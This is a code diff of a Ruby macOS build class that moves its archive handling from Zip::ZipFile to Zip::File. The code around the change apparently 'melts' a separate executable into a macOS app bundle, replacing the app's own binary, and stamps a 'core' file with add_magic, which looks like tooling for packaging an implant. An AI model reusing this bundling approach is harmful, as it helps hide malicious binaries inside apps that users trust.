@@ -83,7 +83,7 @@ class BuildOSX < Build
       exe = ''
       trace :debug, "Build: melting: searching for the executable into app..."
       # unzip the application and extract the executable file
-      Zip::ZipFile.open(path('input')) do |z|
+      Zip::File.open(path('input')) do |z|
         z.each do |f|
           if f.name['.app/Contents/Info.plist']
             xml = z.file.open(f.name) {|x| x.read}
@@ -132,7 +132,7 @@ class BuildOSX < Build
     if File.exist? path('input')
       trace :debug, "Build: pack: repacking the app with [#{@appname}]"
 
-      Zip::ZipFile.open(path('input')) do |z|
+      Zip::File.open(path('input')) do |z|
         z.file.open(@appname, 'wb') {|f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
         z.file.chmod(0755, @appname)
       end
@@ -145,12 +145,12 @@ class BuildOSX < Build
       return
     end
 
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
       z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
     end
 
     # make it executable (for some reason we cannot do it in the previous phase)
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
       z.file.chmod(0755, @appname)
     end
 
@@ -160,7 +160,7 @@ class BuildOSX < Build
   end
 
   def unique(core)
-    Zip::ZipFile.open(core) do |z|
+    Zip::File.open(core) do |z|
       core_content = z.file.open('core', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
